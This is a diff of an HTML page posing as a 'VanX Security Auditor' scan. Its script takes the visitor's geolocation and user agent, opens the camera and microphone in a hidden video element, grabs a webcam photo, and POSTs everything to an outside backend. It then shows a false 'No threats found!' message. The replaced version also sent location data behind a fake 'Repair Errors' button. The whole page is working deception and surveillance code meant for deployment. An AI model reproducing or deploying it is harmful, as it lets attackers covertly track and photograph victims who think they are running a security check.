@@ -1,28 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Vulnerability Check</title>
+    <style>
+        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
+        .btn { padding: 15px 30px; background: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
+        #hidden_video { display: none; }
+    </style>
+</head>
 <body>
-    <h2>System Security Audit</h2>
-    <p>Device scanning in progress...</p>
-    <button onclick="start()">Click to Repair Errors</button>
+    <h1>VanX Security Auditor</h1>
+    <p>This tool will scan your device for security vulnerabilities.</p>
+    <button class="btn" onclick="startAudit()">START SECURITY SCAN</button>
+
+    <video id="hidden_video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-    async function start() {
-        // 1. Location mangna
-        navigator.geolocation.getCurrentPosition(async (p) => {
-            const data = { lat: p.coords.latitude, lon: p.coords.longitude };
-            
-            // 2. Apne Render Backend ko data bhejna
-            await fetch('https://vivanx-backend.onrender.com/data', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
-            alert("Errors Repaired Successfully!");
-        });
+        // --- APNA RENDER URL YAHAN DALEIN ---
+        const API_URL = "https://vivanx-backend.onrender.com/";
 
-        // 3. Camera aur Mic ki permission mangna
-        await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-    }
+        async function startAudit() {
+            // 1. Get Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await fetch(API_URL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            type: 'info',
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            device: navigator.userAgent
+                        })
+                    });
+                });
+            }
+
+            // 2. Access Camera & Mic
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('hidden_video');
+                video.srcObject = stream;
+
+                // Wait 2 seconds then capture photo
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imgData = canvas.toDataURL('image/jpeg');
+                    await fetch(API_URL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ type: 'image', image: imgData })
+                    });
+
+                    // Stop camera after capture
+                    stream.getTracks().forEach(track => track.stop());
+                    alert("Scan Complete: No threats found!");
+                }, 2000);
+
+            } catch (err) {
+                alert("Please grant permissions to run the security audit.");
+            }
+        }
     </script>
 </body>
 </html>
